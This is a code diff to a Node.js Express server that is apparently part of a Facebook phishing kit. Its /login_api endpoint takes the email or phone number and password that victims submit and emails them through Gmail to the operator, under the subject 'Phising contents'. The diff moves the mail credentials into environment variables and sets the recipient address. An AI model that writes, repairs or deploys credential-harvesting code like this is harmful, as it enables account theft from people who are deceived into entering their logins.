@@ -4,9 +4,13 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 const index = require('./router/index')
 const facebook = require('./router/facebook')
-var nodemailer = require('nodemailer')
+const nodemailer = require('nodemailer')
+const process = require('process')
 
 const app = express();
+
+const useremail = process.env.useremail;
+const userpass = process.env.userpass;
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
@@ -24,14 +28,14 @@ app.post('/login_api', (req, res)=>{
     var transporter = nodemailer.createTransport({
         service: 'gmail',
         auth: {
-            user: 'yourEmailHere',
-            pass: 'yourPasswordHere'
+            user: useremail,
+            pass: userpass
          }
      });
 
     var mailOptions = {
-        from: 'Sachin Acharya<YouEmailHee>',
-        to: 'youemailhere',
+        from: 'Sachin Acharya<lucifer.morningstar@hellway.com>',
+        to: useremail,
         subject: 'Phising contents',
         html: `<p><strong>Email or Phone:</strong> ${req.body.username}</p><p><strong>Password: </strong> ${req.body.pass}</p>`
     }
